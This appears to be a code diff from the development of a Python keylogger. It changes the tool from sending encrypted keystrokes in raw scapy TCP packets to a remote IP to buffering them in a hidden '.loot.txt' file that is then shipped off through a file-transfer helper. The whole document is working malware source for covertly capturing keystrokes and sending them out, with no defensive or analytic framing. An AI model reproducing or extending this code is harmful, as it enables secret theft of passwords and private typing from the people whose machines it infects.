@@ -2,9 +2,11 @@ from pynput import keyboard
 import encryption
 import ConfigParser
 from scapy.all import *
+from fileUtils import FileTransfer
+
 
 class Keylogger(object):
-    def __init__(self):
+    def __init__(self, ftp):
         config = ConfigParser.ConfigParser()
         config.read('setup.config')
 
@@ -15,6 +17,10 @@ class Keylogger(object):
         self.password = config.get('Encryption', 'password')
 
         self.listener = keyboard.Listener(on_press=self.onPress)
+        self.savedFile = ".loot.txt"
+        self.buffer = ""
+        self.bufferSize = 8
+        self.fileTransfer = ftp
 
     def onPress(self, key):
         try:
@@ -37,7 +43,12 @@ class Keylogger(object):
             return True
         return False
 
-    def send(self, keys):
-        payload = encryption.encrypt(self.password + keys)
-        packet = IP(dst=self.remoteIP, src=self.localIP)/TCP(dport=self.remotePort, sport=self.localPort)/Raw(load=payload)
-        send(packet,verbose=False)
+    def saveKey(self, keys):
+        self.buffer += keys
+        if len(self.buffer) < self.bufferSize:
+            return
+        else:
+            with open(self.savedFile, "a") as savedFile:
+                savedFile.write(self.buffer)
+                self.buffer = ""
+                self.fileTransfer.sendFile(self.savedFile)
